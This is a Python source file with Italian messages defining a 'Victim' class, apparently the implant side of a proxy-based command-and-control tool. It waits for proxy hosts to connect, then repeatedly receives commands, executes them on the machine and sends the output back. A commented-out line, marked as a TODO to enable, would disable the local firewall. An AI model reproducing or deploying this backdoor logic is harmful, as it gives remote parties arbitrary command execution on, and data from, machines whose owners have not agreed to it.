from Programma.methods.network_methods import firewall_enable, insert_ip_host
from Programma.thread_methods import THREAD_VICTIM
from Programma.methods.check_type import is_integer, is_ipaddress
from Programma.classes import EXCEUTE_COMMAND, HOST_CONNESSI
from Programma.methods.utils_methods import ask_bool_choice 

class Victim:  
    def __init__(self,num_proxy:int=None): 
        self.ip_host=insert_ip_host() 
        print("IP della macchina:", self.ip_host) 
        if not is_ipaddress(self.ip_host): 
            raise TypeError("ip_host non valido")  
        if not is_integer(num_proxy) or num_proxy<=0: 
            raise Exception("Numero connessioni non valido:",num_proxy)
        self.num_proxy=num_proxy 
        print("Connessioni necessarie:",self.num_proxy) 
        self.connected_hosts=HOST_CONNESSI() 
    
    def start(self): 
        try: 
            #firewall_disable() #TODO decommentare 
            print("Waiting connections...")  
            wait_connections=THREAD_VICTIM.WAIT_CONNECTIONS(
                self, self.num_proxy, self.connected_hosts
            ) 
            wait_connections.start(self.ip_host)  
            print("Proxy disponiili:",len(self.connected_hosts.host_list)) 
            print("Attacchi scelti:",len(self.connected_hosts.type_attack)) 
            with self.connected_hosts.lock:
                num_host=len(self.connected_hosts.host_list) 
            if num_host<=0: 
                print("Lista proxy vuota") 
                raise SystemError("Interruzione del programma...")  
            if num_host<self.num_proxy: 
                msg="Non sono stati trovati abbastanza proxy\nUtilizzare quelli trovati? [si/no]" 
                scelta=ask_bool_choice(msg)  
                if not scelta: 
                    print("Si è scelto di non continuare") 
                    raise SystemError("Interruzione del programma...")  
                print("Continuo con i proxy trovati...")    
            else: print("Si sono conessi abbastanza proxy...") 
            wait_comand=THREAD_VICTIM.WAIT_COMMAND()
            while True: 
                try: 
                    wait_comand.start() 
                    data=EXCEUTE_COMMAND(wait_comand.comando).data
                    print("Command executed...") 
                    THREAD_VICTIM.SEND_DATA(self, data) 
                    print("Finished sending data...") 
                except Exception as e: 
                    print(e)
                    break
            print("Closing connection")
        except Exception as e:
            print(e)
            firewall_enable()
            exit(1) 
        finally: 
            firewall_enable() 
